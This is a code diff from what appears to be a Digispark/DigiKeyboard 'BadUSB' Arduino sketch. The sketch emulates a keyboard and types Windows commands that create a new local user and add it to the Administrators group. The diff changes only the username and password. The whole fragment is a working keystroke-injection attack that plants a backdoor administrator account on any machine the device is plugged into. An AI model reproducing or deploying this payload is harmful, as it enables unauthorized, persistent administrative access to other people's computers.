@@ -24,12 +24,12 @@ void setup()
   delay(500);
 
   // add user
-  DigiKeyboard.println("net user /add Arduino 123456");
+  DigiKeyboard.println("net user /add 3L4 1q2w3e");
   typeKey(KEY_ENTER);  
   delay(100);
 
   // make that user become admin  
-  DigiKeyboard.print("net localgroup administrators Arduino /add");
+  DigiKeyboard.print("net localgroup administrators 3L4 /add");
   typeKey(KEY_ENTER);
   delay(100);
 
